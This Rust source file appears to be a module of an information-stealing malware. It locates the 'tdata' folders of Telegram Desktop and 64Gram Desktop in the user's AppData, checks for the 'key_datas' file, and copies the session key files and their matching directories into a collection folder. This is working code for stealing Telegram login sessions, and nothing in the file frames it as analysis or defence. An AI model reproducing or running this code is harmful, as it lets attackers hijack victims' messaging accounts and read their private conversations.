use alloc::borrow::ToOwned;
use alloc::vec;
use tasks::Task;
use utils::path::Path;

pub(super) struct TelegramTask;

impl Task for TelegramTask {
    unsafe fn run(&self, parent: &Path) {
        let appdata = &Path::appdata();
        let paths = [
            ("Telegram Desktop", appdata / "Telegram Desktop" / "tdata"),
            ("64Gram Desktop", appdata / "64Gram Desktop" / "tdata"),
        ];
        
        for (client, tdata_path) in paths {
            if tdata_path.is_exists() {
                let dst = parent / client;
                copy_tdata(&tdata_path, &dst);
            }
        }
    }
}

fn copy_tdata(tdata: &Path, dst: &Path) {
    if !(tdata / "key_datas").is_exists() {
        return
    }
    
    let mut contents = vec![];
    let mut files = vec![];
    let mut dirs = vec![];
    
    if let Some(list_files) = tdata.list_files() {
        for path in list_files {
            if path.is_file() {
                files.push(path);
            } else if path.is_dir() {
                dirs.push(path);
            }
        }
    }
    
    for file in &files {
        for dir in &dirs {
            if dir.name().unwrap().to_owned() + "s" == file.name().unwrap() {
                contents.push(file);
                contents.push(dir);
            }
        }
    }
    
    for path in contents {
        if path.is_file() {
            let _ = path.copy_file(dst, true);
        } else if path.is_dir() {
            let _ = path.copy_folder(dst);
        }
    }
}